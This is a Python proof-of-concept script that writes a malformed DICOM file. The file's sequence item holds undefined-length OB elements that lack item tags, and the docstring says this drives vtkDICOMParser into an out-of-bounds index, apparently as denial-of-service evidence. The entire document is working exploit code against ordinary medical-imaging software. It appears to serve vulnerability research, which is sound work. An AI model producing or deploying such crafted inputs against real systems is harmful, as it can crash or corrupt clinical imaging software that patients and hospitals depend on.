#!/usr/bin/env python3
"""Craft a DICOM sequence item whose OB/OW elements have undefined length but
are NOT followed by an item tag.  vtkDICOMParser::ReadElementValue returns 0
with its local vtkDICOMValue still invalid; ReadElements skips the short-read
check for vl==0xffffffff and calls Item->Set(tag, v), i.e. a delete.

The element sequence mirrors tools/realitem-probe.cxx: fill 1..4, delete 3,
insert+delete 5, insert 6,7,8 -> a Set indexes a slot past the store.
"""
import os
import struct
import sys

OUT = sys.argv[1] if len(sys.argv) > 1 else "evidence/undef-ob-dos.dcm"


def ex(g, e, vr, value):
    head = struct.pack("<HH", g, e) + vr.encode("ascii")
    if vr in ("OB", "OW", "OF", "SQ", "UN", "UT", "OD", "OL", "OV", "UC", "UR", "SV", "UV"):
        return head + b"\x00\x00" + struct.pack("<I", len(value)) + value
    return head + struct.pack("<H", len(value)) + value


def us(e, v):
    return ex(0x0008, e, "US", struct.pack("<H", v))


def bad_ob(e, vr="OB"):
    # undefined length, but the following 8 bytes are an ordinary US element
    # header (tag+VR+VL), not (FFFE,E000)/(FFFE,E0DD)
    return struct.pack("<HH", 0x0008, e) + vr.encode("ascii") + b"\x00\x00" + b"\xff\xff\xff\xff"


def item(payload):
    return struct.pack("<HHI", 0xFFFE, 0xE000, len(payload)) + payload


def main():
    final_tag = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x00080008
    fg, fe = final_tag >> 16, final_tag & 0xffff
    final = ex(fg, fe, "US", struct.pack("<H", 0x108))
    payload = b"".join([
        us(1, 0x101),
        us(2, 0x102),
        us(3, 0x103),
        us(4, 0x104),
        bad_ob(3),
        us(5, 0x105),
        bad_ob(5),
        us(6, 0x106),
        us(7, 0x107),
        final,
        struct.pack("<HHI", 0xFFFE, 0xE00D, 0),
    ])
    body = ex(0x0008, 0x1110, "SQ",
              item(payload) + struct.pack("<HHI", 0xFFFE, 0xE0DD, 0))
    data = b"\x00" * 128 + b"DICM" + body
    os.makedirs(os.path.dirname(OUT) or ".", exist_ok=True)
    with open(OUT, "wb") as f:
        f.write(data)
    print("wrote %s (%d bytes)" % (OUT, len(data)))


if __name__ == "__main__":
    main()
